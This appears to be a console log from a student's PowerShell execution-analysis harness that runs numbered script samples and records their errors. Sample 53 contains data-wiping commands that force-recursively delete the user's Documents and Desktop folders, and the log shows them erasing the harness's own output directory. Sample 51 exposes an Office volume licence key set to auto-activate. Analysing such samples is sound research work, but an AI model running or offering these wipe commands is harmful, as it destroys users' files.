+←[31;1mGet-Content: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:118←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 118 | ←[0m (←[36;1mGet-Content -Path "start-webui-vicuna.bat"←[0m) | ForEach-Object {←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Windows\System32\start-webui-vicuna.bat' because it does not exist.←[0m
+←[31;1mRead-Host: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:131←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 131 | ←[0m $shortcuts = ←[36;1mRead-Host "Do you want desktop shortcuts? (Y/N)"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mPowerShell is in NonInteractive mode. Read and Prompt functionality is not available.←[0m
+←[31;1mRead-Host: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:161←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 161 | ←[0m     $choice = ←[36;1mRead-Host "1 (CPU) or 2 (GPU)"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mPowerShell is in NonInteractive mode. Read and Prompt functionality is not available.←[0m
+Executed {50}
+Executing {51}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1m<←[0mConfiguration>←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:2←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   2 | ←[0m   ←[36;1m<←[0mAdd OfficeClientEdition="64" Channel="PerpetualVL2021">←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m   ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m     ←[36;1m<←[0mProduct ID="ProPlus2021Volume" PIDKEY="FXYTK-NJJ8C-GB6DW-3DYQT-6 .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:4←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   4 | ←[0m       ←[36;1m<←[0mLanguage ID="es-es" />←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m       ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m     ←[36;1m<←[0m/Product>←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m   ←[36;1m<←[0m/Add>←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m   ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:7←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   7 | ←[0m   ←[36;1m<←[0mRemoveMSI />←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m   ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:8←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   8 | ←[0m   ←[36;1m<←[0mUpdates Enabled="TRUE" />←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m   ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:9←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   9 | ←[0m   ←[36;1m<←[0mProperty Name="AUTOACTIVATE" Value="1" />←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m   ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1m<: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\51.ps1:10←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  10 | ←[0m ←[36;1m<←[0m/Configuration>←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term '<' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+Executed {51}
+Executing {52}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\52.ps1
+←[31;1mConvert-UrlEncodedToAscii: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\52.ps1:32←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  32 | ←[0m $fullASCII = Convert-UrlEncodedToAscii ←[36;1m$webURL←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                                        ~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot bind argument to parameter 'UrlEncodedString' because it is an empty string.←[0m
+Executed {52}
+Executing {53}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m ←[36;1mRemove-Item "$HOME\Documents\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mAccess to the path 'C:\Users\unina\Documents\My Music' is denied.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m ←[36;1mRemove-Item "$HOME\Documents\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mAccess to the path 'C:\Users\unina\Documents\My Pictures' is denied.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m ←[36;1mRemove-Item "$HOME\Documents\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mAccess to the path 'C:\Users\unina\Documents\My Videos' is denied.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe process cannot access the file 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx\52.evtx'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mbecause it is being used by another process.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe process cannot access the file 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx\52.evtx'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mbecause it is being used by another process.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe process cannot access the file 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx\52.evtx'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mbecause it is being used by another process.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe process cannot access the file 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx\52.evtx'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mbecause it is being used by another process.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe process cannot access the file 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx\52.evtx'←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mbecause it is being used by another process.←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\evtx'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis'←[0m
+←[31;1mRemove-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\53.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mRemove-Item "$HOME\Desktop\*" -Exclude desktop.ini -Force -Recurse←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe directory is not empty. : 'C:\Users\unina\Desktop\tesi'←[0m
+Executed {53}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\53.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {54}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\54.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\54.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\54.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {54}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\54.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {55}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\55.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\55.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
